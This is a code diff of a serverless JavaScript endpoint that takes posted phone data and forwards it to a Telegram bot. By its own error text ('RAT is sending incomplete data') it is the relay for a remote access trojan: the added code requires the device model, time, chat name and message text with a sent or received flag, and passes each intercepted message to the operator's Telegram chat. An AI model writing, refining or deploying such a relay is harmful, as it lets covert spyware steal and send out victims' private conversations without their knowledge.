@@ -16,35 +16,25 @@ export default async function handler(request, response) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    if (Object.keys(data).length === 0) {
-        return response.status(400).json({ error: 'No data received' });
+    const { model, time, type, chat, message } = data;
+
+    if (!model || !time || !type || !chat || !message) {
+        return response.status(400).json({ error: 'RAT is sending incomplete data. Required: model, time, type, chat, message.' });
     }
 
     try {
-        let messageLines = [];
-        let status = '⚪️ INFO'; 
-        let dataType = data.type || data.status;
+        const status = type.toLowerCase() === 'sent' ? '📤 SENT' : '📥 RECEIVED';
 
-        if (dataType && typeof dataType === 'string') {
-            if (dataType.toLowerCase().includes('sent')) {
-                status = '📤 SENT';
-            } else if (dataType.toLowerCase().includes('received')) {
-                status = '📥 RECEIVED';
-            }
-            delete data.type;
-            delete data.status;
-        }
-        
-        messageLines.push(status);
-        messageLines.push('');
+        const formattedMessage = `
+📱 ${model}
+🕚 Time: ${time}
 
-        for (const [key, value] of Object.entries(data)) {
-            const formattedKey = key.charAt(0).toUpperCase() + key.slice(1);
-            messageLines.push(`*${formattedKey}*: \`${value}\``);
-        }
+${status}
 
-        const formattedMessage = messageLines.join('\n');
-        
+Chat: ${chat}
+Message: ${message}
+        `.trim();
+
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
         await fetch(telegramApiUrl, {
@@ -52,8 +42,7 @@ export default async function handler(request, response) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: formattedMessage,
-                parse_mode: 'Markdown',
+                text: formattedMessage
             }),
         });
         
